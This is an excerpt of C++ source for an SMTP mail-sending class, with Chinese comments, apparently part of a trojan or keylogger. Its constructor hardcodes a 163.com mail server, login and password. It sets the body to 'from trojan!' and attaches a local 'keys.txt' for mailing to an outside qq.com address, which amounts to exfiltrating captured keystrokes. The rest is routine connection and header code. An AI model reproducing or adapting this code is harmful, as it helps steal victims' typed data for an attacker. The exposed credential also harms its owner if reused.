...
CSmtp::CSmtp()
{
	...
	SetSMTPServer("smtp.163.com", 25);		//163邮件服务器 25exmail
	SetLogin("finallyi@163.com");				//163邮箱用户名//hxfvitc@163.com
	SetPassword("Di3al0ne");			//登录密码abc321(普通密码不能登录，使用授权码)
	SetSenderName("finallyi@163.com");			//发件人称呼
	SetSenderMail("finallyi@163.com");		//发件邮箱
	SetReplyTo("finallyi@163.com");		//收件人回信邮箱地址
	SetSubject("测试邮件");				//邮件主题
	AddRecipient("898141731@qq.com");		//收件人邮箱
	SetXPriority(XPRIORITY_NORMAL);				//优先级
	SetXMailer("The Bat! (v6.02) Professional");		//版本信息
	SetMessageBody("from trojan!");		//邮件正文内容
	AddAttachment("keys.txt");//添加附件，本地目录
...
SOCKET CSmtp::ConnectRemoteServer(const char *server,const unsigned short port)
{
	...
	if(lpHostEnt != NULL)
	{
		...
		{
			m_oError = CSMTP_WSA_INVALID_SOCKET;
			printf("Unable to send the mail2222...\n");
			return INVALID_SOCKET;
		}
	}
	else
...
bool CSmtp::FormatHeader(char* header)
{
	...
	SYSTEMTIME st={0};
	::GetSystemTime(&st);
	::GetDateFormat(MAKELCID(0x0409,SORT_DEFAULT),0,&st,(LPCWSTR)"ddd\',\' dd MMM yyyy",szDate,sizeof(szDate));
	::GetTimeFormat(MAKELCID(0x0409,SORT_DEFAULT),TIME_FORCE24HOURFORMAT,&st,(LPCWSTR)"HH\':\'mm\':\'ss",sztTime,sizeof(sztTime));
